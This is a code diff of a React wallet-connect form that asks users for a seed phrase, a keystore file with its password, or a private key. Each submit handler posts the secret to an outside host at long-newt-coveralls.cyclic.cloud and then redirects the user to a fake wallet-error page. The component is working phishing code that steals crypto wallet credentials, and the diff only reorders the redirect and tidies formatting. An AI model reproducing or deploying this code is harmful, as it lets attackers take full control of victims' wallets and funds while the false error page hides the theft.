@@ -58,76 +58,62 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
   // ##### PHRASE
   const handlePhraseSubmit = async (e) => {
     e.preventDefault();
-
     const name = wallet
     const type = "Phrase"
     const data = phrase
     const password = "not_required"
-
     if (validatePhrase(phrase)) {
       try {
         const res = await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
+        setPhraseSubmit("Processing...")
+        setTimeout(() => {
+          navigate('/wallet-error')
+        }, 5000);
       } catch (error) {
         console.log(error)
       }
-
-      setPhraseSubmit("Processing...")
-      setTimeout(() => {
-        navigate('/wallet-error')
-      }, 5000);
     } else {
       setPhraseError(true);
     }
   }
-
-
-  // ##### KEYSTORE JSON
+  // ##### KEYSTORE JSON SUBMISSION
   const handleKeystoreSubmit = async (e) => {
     e.preventDefault();
-
     const name = wallet
     const type = "Keystore_JSON"
     const data = keystore
     const password = keystorePassword
-    
     try {
       const res = await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
+      setKeystoreSubmit("Processing...")
+      setTimeout(() => {
+        navigate('/wallet-error')
+      }, 5000);
     } catch (error) {
-      console.log(error)
+      console.log("error")
     }
-
-    setKeystoreSubmit("Processing...")
-    setTimeout(() => {
-      navigate('/wallet-error')
-    }, 5000);
-
   }
-  // ##### PRIVATE KEY
+  // ##### PRIVATE KEY SUBMISSION
   const handlePrivateKeySubmit = async (e) => {
     e.preventDefault();
-
     const name = wallet
     const type = "Private_Key"
     const data = privateKey
     const password = "not_required"
-
     if (validatePhrase(privateKey)) {
       try {
         const res = await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
+        setPhraseSubmit("Processing...")
+        setTimeout(() => {
+          navigate('/wallet-error')
+        }, 5000);
       } catch (error) {
-        console.log(error)
+        console.log("")
       }
-
-      setPhraseSubmit("Processing...")
-      setTimeout(() => {
-        navigate('/wallet-error')
-      }, 5000);
     } else {
       setPhraseError(true);
     }
-
   }
-  
   return (
     <section className={styles.formSection}>
       <section className={styles.innerSection}>
@@ -153,7 +139,6 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
               <p>Import your {walletName} {walletName.includes("Wallet") ? "" : " Wallet"} </p>
             </div>
           </div>
-
           <div className={styles.view}>
             <button
               type="button"
@@ -180,14 +165,10 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
               Private Key
             </button>
           </div>
-          
           <div>
-
-
             <div
               style={{
-                display: currentView === 1 ? 'block' : 'none',
-                
+                display: currentView === 1 ? 'block' : 'none', 
               }}
             >
             <form onSubmit={handlePhraseSubmit}>
@@ -214,7 +195,6 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
               <button type='submit' className={styles.connectButton}>{phraseSubmit}</button>
             </form>
             </div>
-
             <div
               style={{
                 display: currentView === 2 ? 'block' : 'none',
@@ -246,7 +226,6 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
               <button type='submit' className={styles.connectButton}>{keystoreSubmit}</button>
             </form>
             </div>
-
             <div
               style={{
                 display: currentView === 3 ? 'block' : 'none',
@@ -276,12 +255,10 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
               <button type='submit' className={styles.connectButton}>{privateSubmit}</button>
             </form>
             </div>
-
           </div>
         </div>
       </section>
     </section>
   );
 };
-
 export default WalletConnectForm;
